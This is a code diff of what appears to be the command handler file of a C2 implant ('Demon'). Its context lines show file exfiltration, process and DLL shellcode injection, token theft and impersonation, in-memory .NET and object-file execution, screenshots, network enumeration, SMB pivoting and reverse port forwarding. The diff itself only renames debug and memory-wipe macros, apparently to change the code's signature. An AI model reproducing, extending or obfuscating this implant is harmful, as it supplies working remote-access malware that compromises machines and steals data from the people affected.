@@ -89,7 +89,7 @@ VOID CmdDispat( VOID )
         // read from pipe to receive new tasks
         if ( ! SMBGetJob( &DataBuffer, &DataBufferSize ) )
         {
-            PUTS( "SMBGetJob failed" )
+            STUP( "SMBGetJob failed" )
             continue;
         }
 #endif
@@ -133,7 +133,7 @@ VOID CmdDispat( VOID )
         else
         {
 #ifdef TRANSPORT_HTTP
-            PUTS( "TransportSend: Failed" )
+            STUP( "TransportSend: Failed" )
             break;
 #endif
         }
@@ -157,12 +157,12 @@ VOID CmdDispat( VOID )
 
     Instance->Session.Connected = FALSE;
 
-    PUTS( "Out of while loop" )
+    STUP( "Out of while loop" )
 }
 
 VOID CommandCheckin( PPARSER Parser )
 {
-    PUTS( "Checkin" )
+    STUP( "Checkin" )
 
     PPACKAGE Package = PackageCreate( DEMON_COMMAND_CHECKIN );
 
@@ -187,7 +187,7 @@ VOID CommandSleep( PPARSER Parser )
 
 VOID CommandJob( PPARSER Parser )
 {
-    PUTS( "Job" )
+    STUP( "Job" )
     PPACKAGE Package = PackageCreate( DEMON_COMMAND_JOB );
     DWORD    Command = ParserGetInt32( Parser );
 
@@ -197,7 +197,7 @@ VOID CommandJob( PPARSER Parser )
     {
         case DEMON_COMMAND_JOB_LIST:
         {
-            PUTS( "Job::list" )
+            STUP( "Job::list" )
             PJOB_DATA JobList = Instance->Jobs;
 
             do {
@@ -220,7 +220,7 @@ VOID CommandJob( PPARSER Parser )
 
         case DEMON_COMMAND_JOB_SUSPEND:
         {
-            PUTS( "Job::suspend" )
+            STUP( "Job::suspend" )
             DWORD JobID   = ParserGetInt32( Parser );
             BOOL  Success = JobSuspend( JobID );
 
@@ -234,7 +234,7 @@ VOID CommandJob( PPARSER Parser )
 
         case DEMON_COMMAND_JOB_RESUME:
         {
-            PUTS( "Job::resume" )
+            STUP( "Job::resume" )
             DWORD JobID   = ParserGetInt32( Parser );
             BOOL  Success = JobResume( JobID );
 
@@ -246,7 +246,7 @@ VOID CommandJob( PPARSER Parser )
 
         case DEMON_COMMAND_JOB_KILL_REMOVE:
         {
-            PUTS( "Job::kill" )
+            STUP( "Job::kill" )
             DWORD JobID   = ParserGetInt32( Parser );
             BOOL  Success = JobKill( JobID );
 
@@ -269,7 +269,7 @@ VOID CommandProc( PPARSER Parser )
 
     switch ( SubCommand )
     {
-        case DEMON_COMMAND_PROC_MODULES: PUTS( "Proc::Modules" )
+        case DEMON_COMMAND_PROC_MODULES: STUP( "Proc::Modules" )
         {
             PROCESS_BASIC_INFORMATION ProcessBasicInfo = { 0 };
             UINT32                    ProcessID        = 0;
@@ -334,7 +334,7 @@ VOID CommandProc( PPARSER Parser )
             break;
         }
 
-        case DEMON_COMMAND_PROC_GREP: PUTS("Proc::Grep")
+        case DEMON_COMMAND_PROC_GREP: STUP("Proc::Grep")
         {
             PSYSTEM_PROCESS_INFORMATION SysProcessInfo  = NULL;
             PSYSTEM_PROCESS_INFORMATION PtrProcessInfo  = NULL; /* is going to hold the original pointer of SysProcessInfo */
@@ -391,7 +391,7 @@ VOID CommandProc( PPARSER Parser )
                         }
 
                         if ( UserDomain.Buffer ) {
-                            MemZero( UserDomain.Buffer, UserDomain.Length );
+                            MemeZ( UserDomain.Buffer, UserDomain.Length );
                             MmHeapFree( UserDomain.Buffer );
                             UserDomain.Buffer = NULL;
                         }
@@ -420,7 +420,7 @@ VOID CommandProc( PPARSER Parser )
             break;
         }
 
-        case DEMON_COMMAND_PROC_CREATE: PUTS( "Proc::Create" )
+        case DEMON_COMMAND_PROC_CREATE: STUP( "Proc::Create" )
         {
             PROCESS_INFORMATION ProcessInfo     = { 0 };
             UINT32              ProcessSize     = 0;
@@ -465,7 +465,7 @@ VOID CommandProc( PPARSER Parser )
             break;
         }
 
-        case DEMON_COMMAND_PROC_MEMORY: PUTS( "Proc::Memory" )
+        case DEMON_COMMAND_PROC_MEMORY: STUP( "Proc::Memory" )
         {
             DWORD                    ProcessID   = ParserGetInt32( Parser );
             DWORD                    QueryProtec = ParserGetInt32( Parser );
@@ -525,7 +525,7 @@ VOID CommandProc( PPARSER Parser )
             break;
         }
 
-        case DEMON_COMMAND_PROC_KILL: PUTS( "Proc::Kill" )
+        case DEMON_COMMAND_PROC_KILL: STUP( "Proc::Kill" )
         {
             DWORD  dwProcessID = ParserGetInt32( Parser );
             HANDLE hProcess    = NULL;
@@ -602,7 +602,7 @@ VOID CommandProcList(
                 if ( NT_SUCCESS( NtStatus = SysNtOpenProcessToken( Process, TOKEN_QUERY, &Token ) ) ) {
                     /* query the username and domain */
                     if ( ! TokenQueryOwner( Token, &UserDomain, TOKEN_OWNER_FLAG_DEFAULT ) ) {
-                        PUTS( "Failed to get Username and Domain\n" );
+                        STUP( "Failed to get Username and Domain\n" );
                     } else {
                         PRINTF( "UserDomain: %ls\n", UserDomain.Buffer )
                     }
@@ -643,7 +643,7 @@ VOID CommandProcList(
             }
 
             if ( UserDomain.Buffer ) {
-                MemZero( UserDomain.Buffer, UserDomain.Length );
+                MemeZ( UserDomain.Buffer, UserDomain.Length );
                 MmHeapFree( UserDomain.Buffer );
                 UserDomain.Buffer = NULL;
                 UserDomain.Length = 0;
@@ -662,7 +662,7 @@ VOID CommandProcList(
 
         /* Free our process list */
         if ( SysProcessPtr ) {
-            MemZero( SysProcessPtr, ProcessInfoSize );
+            MemeZ( SysProcessPtr, ProcessInfoSize );
             MmHeapFree( SysProcessPtr );
             SysProcessPtr  = NULL;
             SysProcessInfo = NULL;
@@ -681,7 +681,7 @@ VOID CommandFS( PPARSER Parser )
 
     switch ( Command )
     {
-        case DEMON_COMMAND_FS_DIR: PUTS( "FS::Dir" )
+        case DEMON_COMMAND_FS_DIR: STUP( "FS::Dir" )
         {
             LPWSTR           TargetFolder = NULL;
             LPWSTR           Path         = NULL;
@@ -791,7 +791,7 @@ VOID CommandFS( PPARSER Parser )
             break;
         }
 
-        case DEMON_COMMAND_FS_DOWNLOAD: PUTS( "FS::Download" )
+        case DEMON_COMMAND_FS_DOWNLOAD: STUP( "FS::Download" )
         {
             PDOWNLOAD_DATA Download = NULL;
             BUFFER         FileName = { 0 };
@@ -812,7 +812,7 @@ VOID CommandFS( PPARSER Parser )
             hFile = Instance->Win32.CreateFileW( FileName.Buffer, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0 );
             if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
             {
-                PUTS( "CreateFileW: Failed" )
+                STUP( "CreateFileW: Failed" )
 
                 PACKAGE_ERROR_WIN32
 
@@ -825,7 +825,7 @@ VOID CommandFS( PPARSER Parser )
 
             if ( ! Instance->Win32.GetFileSizeEx( hFile, &FileSize ) )
             {
-                PUTS( "GetFileSizeEx: Failed" )
+                STUP( "GetFileSizeEx: Failed" )
 
                 PACKAGE_ERROR_WIN32
 
@@ -864,7 +864,7 @@ VOID CommandFS( PPARSER Parser )
                 PackageAddWString( Package, FileName.Buffer );
 
         CleanupDownload:
-            PUTS( "CleanupDownload" )
+            STUP( "CleanupDownload" )
 
             if ( FileName.Buffer )
             {
@@ -879,7 +879,7 @@ VOID CommandFS( PPARSER Parser )
             break;
         }
 
-        case DEMON_COMMAND_FS_UPLOAD: PUTS( "FS::Upload" )
+        case DEMON_COMMAND_FS_UPLOAD: STUP( "FS::Upload" )
         {
             DWORD     FileSize  = 0;
             UINT32    NameSize  = 0;
@@ -916,7 +916,7 @@ VOID CommandFS( PPARSER Parser )
             hFile = Instance->Win32.CreateFileW( FileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );
             if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
             {
-                PUTS( "CreateFileW: Failed" )
+                STUP( "CreateFileW: Failed" )
                 PACKAGE_ERROR_WIN32
                 Success = FALSE;
                 goto CleanupUpload;
@@ -924,7 +924,7 @@ VOID CommandFS( PPARSER Parser )
 
             if ( ! Instance->Win32.WriteFile( hFile, Content, FileSize, &Written, NULL ) )
             {
-                PUTS( "WriteFile: Failed" )
+                STUP( "WriteFile: Failed" )
                 PACKAGE_ERROR_WIN32
                 Success = FALSE;
                 goto CleanupUpload;
@@ -946,7 +946,7 @@ VOID CommandFS( PPARSER Parser )
             break;
         }
 
-        case DEMON_COMMAND_FS_CD: PUTS( "FS::Cd" )
+        case DEMON_COMMAND_FS_CD: STUP( "FS::Cd" )
         {
             UINT32 PathSize = 0;
             LPWSTR Path     = ParserGetWString( Parser, &PathSize );
@@ -961,7 +961,7 @@ VOID CommandFS( PPARSER Parser )
             break;
         }
 
-        case DEMON_COMMAND_FS_REMOVE: PUTS( "FS::Remove" )
+        case DEMON_COMMAND_FS_REMOVE: STUP( "FS::Remove" )
         {
             UINT32 PathSize = 0;
             LPWSTR Path     = ParserGetWString( Parser, &PathSize );
@@ -991,7 +991,7 @@ VOID CommandFS( PPARSER Parser )
             break;
         }
 
-        case DEMON_COMMAND_FS_MKDIR: PUTS( "FS::Mkdir" )
+        case DEMON_COMMAND_FS_MKDIR: STUP( "FS::Mkdir" )
         {
             UINT32 PathSize = 0;
             LPWSTR Path     = ParserGetWString( Parser, &PathSize );
@@ -1007,7 +1007,7 @@ VOID CommandFS( PPARSER Parser )
             break;
         }
 
-        case DEMON_COMMAND_FS_COPY: PUTS( "FS::Copy" )
+        case DEMON_COMMAND_FS_COPY: STUP( "FS::Copy" )
         {
             UINT32 FromSize = 0;
             UINT32 ToSize   = 0;
@@ -1032,7 +1032,7 @@ VOID CommandFS( PPARSER Parser )
             break;
         }
 
-        case DEMON_COMMAND_FS_MOVE: PUTS( "FS::Move" )
+        case DEMON_COMMAND_FS_MOVE: STUP( "FS::Move" )
         {
             UINT32 FromSize = 0;
             UINT32 ToSize   = 0;
@@ -1057,7 +1057,7 @@ VOID CommandFS( PPARSER Parser )
             break;
         }
 
-        case DEMON_COMMAND_FS_GET_PWD: PUTS( "FS::GetPwd" )
+        case DEMON_COMMAND_FS_GET_PWD: STUP( "FS::GetPwd" )
         {
             WCHAR Path[ MAX_PATH * 2 ] = { 0 };
             DWORD Return               = 0;
@@ -1072,7 +1072,7 @@ VOID CommandFS( PPARSER Parser )
             break;
         }
 
-        case DEMON_COMMAND_FS_CAT: PUTS( "FS::Cat" )
+        case DEMON_COMMAND_FS_CAT: STUP( "FS::Cat" )
         {
             DWORD  FileSize = 0;
             UINT32 NameSize = 0;
@@ -1164,30 +1164,30 @@ VOID CommandInlineExecute( PPARSER Parser )
     {
         case 0:
         {
-            PUTS( "Use Non-Threaded CoffeeLdr" )
+            STUP( "Use Non-Threaded CoffeeLdr" )
             CoffeeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize, RequestID );
             break;
         }
 
         case 1:
         {
-            PUTS( "Use Threaded CoffeeRunner" )
+            STUP( "Use Threaded CoffeeRunner" )
             CoffeeRunner( FunctionName, FunctionNameSize, ObjectData, ObjectDataSize, ArgBuffer, ArgSize, RequestID );
             break;
         }
 
         default:
         {
-            PUTS( "Use default (from config) CoffeeLdr" )
+            STUP( "Use default (from config) CoffeeLdr" )
 
             if ( Instance->Config.Implant.CoffeeThreaded )
             {
-                PUTS( "Config is set to threaded" )
+                STUP( "Config is set to threaded" )
                 CoffeeRunner( FunctionName, FunctionNameSize, ObjectData, ObjectDataSize, ArgBuffer, ArgSize, RequestID );
             }
             else
             {
-                PUTS( "Config is set to non-threaded" )
+                STUP( "Config is set to non-threaded" )
                 CoffeeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize, RequestID );
             }
 
@@ -1220,7 +1220,7 @@ VOID CommandInjectDLL( PPARSER Parser )
     DllBytes         = ParserGetBytes( Parser, &DllSize );
     InjCtx.Parameter = ParserGetBytes( Parser, &InjCtx.ParameterSize );
 
-    PUTS( "CommandInjectDLL" )
+    STUP( "CommandInjectDLL" )
     PRINTF( "Technique: %d\n", InjCtx.Technique )
     PRINTF( "ProcessID: %d\n", InjCtx.ProcessID )
     PRINTF( "DllBytes : %x [%d]\n", DllBytes, DllSize );
@@ -1309,7 +1309,7 @@ VOID CommandInjectShellcode(
     /* dispatch injection way */
     switch ( Way )
     {
-        case INJECT_WAY_SPAWN: PUTS( "INJECT_WAY_SPAWN" ) {
+        case INJECT_WAY_SPAWN: STUP( "INJECT_WAY_SPAWN" ) {
             /* use configured target process */
             if ( x64 ) {
                 Spawn = Instance->Config.Process.Spawn64;
@@ -1350,12 +1350,12 @@ VOID CommandInjectShellcode(
             break;
         }
 
-        case INJECT_WAY_INJECT: PUTS( "INJECT_WAY_INJECT" ) {
+        case INJECT_WAY_INJECT: STUP( "INJECT_WAY_INJECT" ) {
             Status = Inject( Method, NULL, Pid, x64, Payload, Size, U_PTR( NULL ),Argv, Argc );
             break;
         }
 
-        case INJECT_WAY_EXECUTE: PUTS( "INJECT_WAY_EXECUTE" ) {
+        case INJECT_WAY_EXECUTE: STUP( "INJECT_WAY_EXECUTE" ) {
             Status = Inject( Method, NtCurrentProcess(), 0, x64, Payload, Size, U_PTR( NULL ),Argv, Argc );
             break;
         }
@@ -1380,7 +1380,7 @@ VOID CommandToken( PPARSER Parser )
     PkgAdIn32( Package, Command );
     switch ( Command )
     {
-        case DEMON_COMMAND_TOKEN_IMPERSONATE: PUTS( "Token::Impersonate" )
+        case DEMON_COMMAND_TOKEN_IMPERSONATE: STUP( "Token::Impersonate" )
         {
             DWORD            dwTokenID = ParserGetInt32( Parser );
             PTOKEN_LIST_DATA TokenData = NULL;
@@ -1394,7 +1394,7 @@ VOID CommandToken( PPARSER Parser )
             }
             else
             {
-                PUTS( "Token not found in vault." )
+                STUP( "Token not found in vault." )
                 PackageTransmitError( CALLBACK_ERROR_TOKEN, 0x1 );
                 PkgAdIn32( Package, FALSE );
                 PkgAdIn32( Package, 0 );
@@ -1403,7 +1403,7 @@ VOID CommandToken( PPARSER Parser )
             break;
         }
 
-        case DEMON_COMMAND_TOKEN_STEAL: PUTS( "Token::Steal" )
+        case DEMON_COMMAND_TOKEN_STEAL: STUP( "Token::Steal" )
         {
             DWORD  TargetPid    = { 0 };
             HANDLE TargetHandle = { 0 };
@@ -1419,12 +1419,12 @@ VOID CommandToken( PPARSER Parser )
 
             /* steal token */
             if ( ! ( StolenToken  = TokenSteal( TargetPid, TargetHandle ) ) ) {
-                PUTS( "[!] Couldn't get remote process token" )
+                STUP( "[!] Couldn't get remote process token" )
                 return;
             }
 
             if ( ! TokenQueryOwner( StolenToken, &UserDomain, TOKEN_OWNER_FLAG_DEFAULT ) ) {
-                PUTS( "Failed to query user/domain from stolen token" )
+                STUP( "Failed to query user/domain from stolen token" )
                 return;
             }
 
@@ -1434,7 +1434,7 @@ VOID CommandToken( PPARSER Parser )
             /* when a new token is stolen, we impersonate it automatically */
             if ( ! ImpersonateTokenFromVault( NewTokenID ) )
             {
-                PUTS( "Failed to impersonate the token" )
+                STUP( "Failed to impersonate the token" )
                 return;
             }
 
@@ -1447,7 +1447,7 @@ VOID CommandToken( PPARSER Parser )
             break;
         }
 
-        case DEMON_COMMAND_TOKEN_LIST: PUTS( "Token::List" )
+        case DEMON_COMMAND_TOKEN_LIST: STUP( "Token::List" )
         {
             PTOKEN_LIST_DATA TokenList  = Instance->Tokens.Vault;
             DWORD            TokenIndex = 0;
@@ -1474,7 +1474,7 @@ VOID CommandToken( PPARSER Parser )
             break;
         }
 
-        case DEMON_COMMAND_TOKEN_PRIVSGET_OR_LIST: PUTS( "Token::PrivsGetOrList" )
+        case DEMON_COMMAND_TOKEN_PRIVSGET_OR_LIST: STUP( "Token::PrivsGetOrList" )
         {
             PTOKEN_PRIVILEGES TokenPrivs     = NULL;
             DWORD             TPSize         = 0;
@@ -1488,7 +1488,7 @@ VOID CommandToken( PPARSER Parser )
 
             if ( ListPrivs )
             {
-                PUTS( "Privs::List" )
+                STUP( "Privs::List" )
                 TokenHandle = TokenCurrentHandle();
 
                 Instance->Win32.GetTokenInformation( TokenHandle, TokenPrivileges, TokenPrivs, 0, &TPSize );
@@ -1512,7 +1512,7 @@ VOID CommandToken( PPARSER Parser )
             }
             else
             {
-                PUTS( "Privs::Get" )
+                STUP( "Privs::Get" )
                 PrivName = ParserGetString( Parser, &PrivNameLength );
 
                 PkgAdIn32( Package, TokenSetPrivilege( PrivName, TRUE ) );
@@ -1529,7 +1529,7 @@ VOID CommandToken( PPARSER Parser )
             break;
         }
 
-        case DEMON_COMMAND_TOKEN_MAKE: PUTS( "Token::Make" )
+        case DEMON_COMMAND_TOKEN_MAKE: STUP( "Token::Make" )
         {
             UINT32 dwUserSize     = 0;
             UINT32 dwPasswordSize = 0;
@@ -1592,7 +1592,7 @@ VOID CommandToken( PPARSER Parser )
             break;
         }
 
-        case DEMON_COMMAND_TOKEN_GET_UID: PUTS( "Token::GetUID" )
+        case DEMON_COMMAND_TOKEN_GET_UID: STUP( "Token::GetUID" )
         {
             BUFFER User  = { 0 };
             HANDLE Token = { 0 };
@@ -1624,7 +1624,7 @@ VOID CommandToken( PPARSER Parser )
 
             /* free queried owner memory */
             if ( User.Buffer ) {
-                MemZero( User.Buffer, User.Length );
+                MemeZ( User.Buffer, User.Length );
                 MmHeapFree( User.Buffer );
                 User.Buffer = NULL;
             }
@@ -1632,7 +1632,7 @@ VOID CommandToken( PPARSER Parser )
             break;
         }
 
-        case DEMON_COMMAND_TOKEN_REVERT: PUTS( "Token::Revert" )
+        case DEMON_COMMAND_TOKEN_REVERT: STUP( "Token::Revert" )
         {
             BOOL Success = TokenRevSelf();
 
@@ -1647,7 +1647,7 @@ VOID CommandToken( PPARSER Parser )
             break;
         }
 
-        case DEMON_COMMAND_TOKEN_REMOVE: PUTS( "Token::Remove" )
+        case DEMON_COMMAND_TOKEN_REMOVE: STUP( "Token::Remove" )
         {
             DWORD TokenID = ParserGetInt32( Parser );
 
@@ -1657,7 +1657,7 @@ VOID CommandToken( PPARSER Parser )
             break;
         }
 
-        case DEMON_COMMAND_TOKEN_CLEAR: PUTS( "Token::Clear" )
+        case DEMON_COMMAND_TOKEN_CLEAR: STUP( "Token::Clear" )
         {
 
             TokenClear();
@@ -1665,7 +1665,7 @@ VOID CommandToken( PPARSER Parser )
             break;
         }
 
-        case DEMON_COMMAND_TOKEN_FIND_TOKENS: PUTS( "Token::Find" )
+        case DEMON_COMMAND_TOKEN_FIND_TOKENS: STUP( "Token::Find" )
         {
             PUSER_TOKEN_DATA TokenList    = NULL;
             DWORD            NumTokens    = 0;
@@ -1781,11 +1781,11 @@ VOID CommandAssemblyInlineExecute( PPARSER Parser )
             DotnetClose();
         }
 
-        PUTS( "Finished with Assembly inline execute" )
+        STUP( "Finished with Assembly inline execute" )
     }
     else
     {
-        PUTS( "Dotnet instance already running." )
+        STUP( "Dotnet instance already running." )
     }
 }
 
@@ -1826,19 +1826,19 @@ VOID CommandAssemblyListVersion( PPARSER Parser )
                             dwStringSize = 0;
                         }
                         else
-                            PUTS("Failed get Version String")
+                            STUP("Failed get Version String")
                     }
                     else break;
                 }
             }
             else
-                PUTS("Failed to enumerate")
+                STUP("Failed to enumerate")
         }
         else
-            PUTS("Failed to CLRCreateInstance");
+            STUP("Failed to CLRCreateInstance");
     }
     else
-        PUTS("Failed to load mscoree.dll")
+        STUP("Failed to load mscoree.dll")
 
 
     if ( pClrMetaHost )
@@ -2083,7 +2083,7 @@ VOID CommandConfig( PPARSER Parser )
 
 VOID CommandScreenshot( PPARSER Parser )
 {
-    PUTS( "Screenshot" )
+    STUP( "Screenshot" )
     PPACKAGE Package = PackageCreate( DEMON_COMMAND_SCREENSHOT );
     PVOID    Image   = NULL;
     SIZE_T   Size    = 0;
@@ -2092,13 +2092,13 @@ VOID CommandScreenshot( PPARSER Parser )
 
     if ( WinScreenshot( &Image, &Size ) )
     {
-        PUTS( "Successful took screenshot" )
+        STUP( "Successful took screenshot" )
         PkgAdIn32( Package, TRUE );
         PackageAddBytes( Package, Image, Size );
     }
     else
     {
-        PUTS( "Failed to take screenshot" )
+        STUP( "Failed to take screenshot" )
         PkgAdIn32( Package, FALSE );
     }
 
@@ -2108,7 +2108,7 @@ VOID CommandScreenshot( PPARSER Parser )
 // TODO: The Net module is unstable so fix those issues to work on normal workstation and domain server
 VOID CommandNet( PPARSER Parser )
 {
-    PUTS( "NET COMMAND" )
+    STUP( "NET COMMAND" )
     PPACKAGE Package    = PackageCreate( DEMON_COMMAND_NET );
     UINT32   NetCommand = ParserGetInt32( Parser );
 
@@ -2118,7 +2118,7 @@ VOID CommandNet( PPARSER Parser )
     {
         case DEMON_NET_COMMAND_DOMAIN:
         {
-            PUTS( "DEMON_NET_COMMAND_DOMAIN" )
+            STUP( "DEMON_NET_COMMAND_DOMAIN" )
 
             LPSTR Domain = NULL;
             DWORD Length = 0;
@@ -2153,7 +2153,7 @@ VOID CommandNet( PPARSER Parser )
 
         case DEMON_NET_COMMAND_LOGONS:
         {
-            PUTS( "DEMON_NET_COMMAND_LOGONS" )
+            STUP( "DEMON_NET_COMMAND_LOGONS" )
 
             LPWKSTA_USER_INFO_0 UserInfo        = NULL;
             DWORD               dwLevel         = 0;
@@ -2214,7 +2214,7 @@ VOID CommandNet( PPARSER Parser )
 
         case DEMON_NET_COMMAND_SESSIONS:
         {
-            PUTS( "DEMON_NET_COMMAND_SESSIONS" )
+            STUP( "DEMON_NET_COMMAND_SESSIONS" )
 
             LPSESSION_INFO_10 SessionInfo       = NULL;
             DWORD             EntriesRead       = 0;
@@ -2276,20 +2276,20 @@ VOID CommandNet( PPARSER Parser )
 
         case DEMON_NET_COMMAND_COMPUTER:
         {
-            PUTS( "DEMON_NET_COMMAND_COMPUTER" )
+            STUP( "DEMON_NET_COMMAND_COMPUTER" )
 
             break;
         }
 
         case DEMON_NET_COMMAND_DCLIST:
         {
-            PUTS( "DEMON_NET_COMMAND_DCLIST" )
+            STUP( "DEMON_NET_COMMAND_DCLIST" )
             break;
         }
 
         case DEMON_NET_COMMAND_SHARE:
         {
-            PUTS( "DEMON_NET_COMMAND_SHARE" )
+            STUP( "DEMON_NET_COMMAND_SHARE" )
 
             PSHARE_INFO_502 ShareInfo    = NULL;
             DWORD           NetStatus    = 0;
@@ -2330,7 +2330,7 @@ VOID CommandNet( PPARSER Parser )
 
         case DEMON_NET_COMMAND_LOCALGROUP:
         {
-            PUTS( "DEMON_NET_COMMAND_LOCALGROUP" )
+            STUP( "DEMON_NET_COMMAND_LOCALGROUP" )
 
             PLOCALGROUP_INFO_1  GroupInfo     = NULL;
             DWORD               EntriesRead   = 0;
@@ -2347,7 +2347,7 @@ VOID CommandNet( PPARSER Parser )
             NetStatus = Instance->Win32.NetLocalGroupEnum( ServerName, 1, (LPBYTE*)&GroupInfo, MAX_PREFERRED_LENGTH, &EntriesRead, &TotalEntries, NULL );
             if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
             {
-                PUTS( "NetLocalGroupEnum => Success" )
+                STUP( "NetLocalGroupEnum => Success" )
                 if ( GroupInfo )
                 {
                     for( DWORD i = 0; i < EntriesRead; i++ )
@@ -2366,7 +2366,7 @@ VOID CommandNet( PPARSER Parser )
 
         case DEMON_NET_COMMAND_GROUP:
         {
-            PUTS( "DEMON_NET_COMMAND_GROUP" )
+            STUP( "DEMON_NET_COMMAND_GROUP" )
 
             PLOCALGROUP_INFO_1  GroupInfo     = NULL;
             DWORD               EntriesRead   = 0;
@@ -2410,7 +2410,7 @@ VOID CommandNet( PPARSER Parser )
 
         case DEMON_NET_COMMAND_USER:
         {
-            PUTS( "DEMON_NET_COMMAND_USER" )
+            STUP( "DEMON_NET_COMMAND_USER" )
 
             LPUSER_INFO_0  UserInfo     = NULL;
             DWORD          NetStatus    = 0;
@@ -2452,7 +2452,7 @@ VOID CommandNet( PPARSER Parser )
 
         default:
         {
-            PUTS( "COMMAND NOT FOUND" )
+            STUP( "COMMAND NOT FOUND" )
             break;
         }
     }
@@ -2473,7 +2473,7 @@ VOID CommandPivot( PPARSER Parser )
     {
         case DEMON_PIVOT_LIST:
         {
-            PUTS( "DEMON_PIVOT_LIST" )
+            STUP( "DEMON_PIVOT_LIST" )
             PPIVOT_DATA TempList = Instance->SmbPivots;
 
             do
@@ -2495,7 +2495,7 @@ VOID CommandPivot( PPARSER Parser )
 
         case DEMON_PIVOT_SMB_CONNECT:
         {
-            PUTS( "DEMON_PIVOT_SMB_CONNECT" )
+            STUP( "DEMON_PIVOT_SMB_CONNECT" )
 
             DWORD  BytesSize = 0;
             PVOID  Output    = NULL;
@@ -2517,7 +2517,7 @@ VOID CommandPivot( PPARSER Parser )
 #ifdef DEBUG
                 PPIVOT_DATA TempList = Instance->SmbPivots;
 
-                PUTS( "Smb Pivots : [ " );
+                STUP( "Smb Pivots : [ " );
                 do {
                     if ( TempList )
                     {
@@ -2526,12 +2526,12 @@ VOID CommandPivot( PPARSER Parser )
                     } else
                         break;
                 } while ( TRUE );
-                PUTS( "]" );
+                STUP( "]" );
 #endif
             }
             else
             {
-                PUTS( "Failed to connect" )
+                STUP( "Failed to connect" )
                 PkgAdIn32( Package, FALSE );
                 PkgAdIn32( Package, NtGetLastError() );
             }
@@ -2554,7 +2554,7 @@ VOID CommandPivot( PPARSER Parser )
 
         case DEMON_PIVOT_SMB_COMMAND:
         {
-            PUTS( "DEMON_PIVOT_SMB_COMMAND" )
+            STUP( "DEMON_PIVOT_SMB_COMMAND" )
 
             UINT32      DemonId   = ParserGetInt32( Parser );
             BUFFER      Data      = { 0 };
@@ -2564,7 +2564,7 @@ VOID CommandPivot( PPARSER Parser )
 
             if ( ! Data.Buffer || ! Data.Length )
             {
-                PUTS( "Can't send empty data to pivot" )
+                STUP( "Can't send empty data to pivot" )
                 return;
             }
 
@@ -2585,7 +2585,7 @@ VOID CommandPivot( PPARSER Parser )
             {
                 if ( ! PipeWrite( PivotData->Handle, &Data ) )
                 {
-                    PUTS( "PipeWrite failed" )
+                    STUP( "PipeWrite failed" )
                     PACKAGE_ERROR_WIN32
                 }
                 else
@@ -2601,7 +2601,7 @@ VOID CommandPivot( PPARSER Parser )
         default: break;
     }
 
-    PUTS( "Pivot transport" )
+    STUP( "Pivot transport" )
     PackageTransmit( Package );
 }
 
@@ -2621,7 +2621,7 @@ VOID CommandTransfer( PPARSER Parser )
 
     switch ( Command )
     {
-        case DEMON_COMMAND_TRANSFER_LIST: PUTS( "Transfer::list" )
+        case DEMON_COMMAND_TRANSFER_LIST: STUP( "Transfer::list" )
         {
             for ( ;; )
             {
@@ -2638,7 +2638,7 @@ VOID CommandTransfer( PPARSER Parser )
             break;
         }
 
-        case DEMON_COMMAND_TRANSFER_STOP: PUTS( "Transfer::stop" )
+        case DEMON_COMMAND_TRANSFER_STOP: STUP( "Transfer::stop" )
         {
             FileID = ParserGetInt32( Parser );
 
@@ -2665,7 +2665,7 @@ VOID CommandTransfer( PPARSER Parser )
             break;
         }
 
-        case DEMON_COMMAND_TRANSFER_RESUME: PUTS( "Transfer::resume" )
+        case DEMON_COMMAND_TRANSFER_RESUME: STUP( "Transfer::resume" )
         {
             FileID = ParserGetInt32( Parser );
 
@@ -2693,7 +2693,7 @@ VOID CommandTransfer( PPARSER Parser )
             break;
         }
 
-        case DEMON_COMMAND_TRANSFER_REMOVE: PUTS( "Transfer::remove" )
+        case DEMON_COMMAND_TRANSFER_REMOVE: STUP( "Transfer::remove" )
         {
             FileID = ParserGetInt32( Parser );
 
@@ -2748,7 +2748,7 @@ VOID CommandSocket( PPARSER Parser )
     PkgAdIn32( Package, Command );
     switch ( Command )
     {
-        case SOCKET_COMMAND_RPORTFWD_ADD: PUTS( "Socket::RPortFwdAdd" )
+        case SOCKET_COMMAND_RPORTFWD_ADD: STUP( "Socket::RPortFwdAdd" )
         {
             DWORD LclAddr = 0;
             DWORD LclPort = 0;
@@ -2783,7 +2783,7 @@ VOID CommandSocket( PPARSER Parser )
             break;
         }
 
-        case SOCKET_COMMAND_RPORTFWD_LIST: PUTS( "Socket::RPortFwdList" )
+        case SOCKET_COMMAND_RPORTFWD_LIST: STUP( "Socket::RPortFwdList" )
         {
             Socket = Instance->Sockets;
 
@@ -2816,7 +2816,7 @@ VOID CommandSocket( PPARSER Parser )
             break;
         }
 
-        case SOCKET_COMMAND_RPORTFWD_REMOVE: PUTS( "Socket::RPortFwdRemove" )
+        case SOCKET_COMMAND_RPORTFWD_REMOVE: STUP( "Socket::RPortFwdRemove" )
         {
             DWORD SocketID = 0;
 
@@ -2847,7 +2847,7 @@ VOID CommandSocket( PPARSER Parser )
             return;
         }
 
-        case SOCKET_COMMAND_RPORTFWD_CLEAR: PUTS( "Socket::RPortFwdClear" )
+        case SOCKET_COMMAND_RPORTFWD_CLEAR: STUP( "Socket::RPortFwdClear" )
         {
             Socket = Instance->Sockets;
 
@@ -2868,14 +2868,14 @@ VOID CommandSocket( PPARSER Parser )
             return;
         }
 
-        case SOCKET_COMMAND_SOCKSPROXY_ADD: PUTS( "Socket::SocksProxyAdd" )
+        case SOCKET_COMMAND_SOCKSPROXY_ADD: STUP( "Socket::SocksProxyAdd" )
         {
             /* TODO: implement */
 
             break;
         }
 
-        case SOCKET_COMMAND_WRITE: PUTS( "Socket::Write" )
+        case SOCKET_COMMAND_WRITE: STUP( "Socket::Write" )
         {
             DWORD  SocketID = 0;
             BUFFER Data     = { 0 };
@@ -2939,7 +2939,7 @@ VOID CommandSocket( PPARSER Parser )
             }
         }
 
-        case SOCKET_COMMAND_CONNECT: PUTS( "Socket::Connect" )
+        case SOCKET_COMMAND_CONNECT: STUP( "Socket::Connect" )
         {
             DWORD  ScId       = 0;
             BYTE   ATYP       = 0;
@@ -3033,7 +3033,7 @@ VOID CommandSocket( PPARSER Parser )
             break;
         }
 
